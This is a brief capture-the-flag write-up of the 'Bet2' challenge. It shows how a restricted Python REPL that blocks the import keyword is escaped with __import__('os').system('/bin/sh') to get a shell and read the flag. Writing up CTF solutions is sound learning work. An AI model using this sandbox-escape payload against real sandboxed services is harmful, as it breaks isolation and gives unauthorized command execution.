
# Bet2
Upon connection to the server and you will be presented with some sort of REPL program.
After fiddling with it a little bit and entering some builtin functions, it looks like a Python REPL.

    root@beer:~/crypto# nc ctf.safebreach.com 31338
	>>> print
	<built-in function print>
	>>> eval
	<built-in function eval>
	>>> getattr
	<built-in function getattr>

So the most natural thing to do here is use `system` to get a shell, right? Well, not so fast:

    >>> import os; system('/bin/sh')
	invalid syntax (<string>, line 1)
	>>> eval('import os; os.system("/bin/sh")')
	invalid syntax (<string>, line 1)
	>>> import subprocess
	invalid syntax (<string>, line 1)

The REPL won't let me import modules using the `import` keyword at all, and I need a binary execution function to get to a shell.
Python sandbox escape has been discussed many times before. There is more than one way to import a module, or call builtin functions.
In this case, what I did was use the `__import__` function to import the `os` module and execute `system`.

    >>> __import__
	<built-in function __import__>
	>>> __import__('os').system('/bin/sh')
	/bin/sh: can't access tty; job control turned off
	/pwn $ cat flag
	cat flag
	CTF{9a4f1813c1874de8aaz3e8407d93ca48}

I recommend reading [this DigitalWhisper (Hebrew) article](https://www.digitalwhisper.co.il/files/Zines/0x5A/DW90-5-PySandbox.pdf) on Python Sandbox escaping if you want to learn more on the subject.
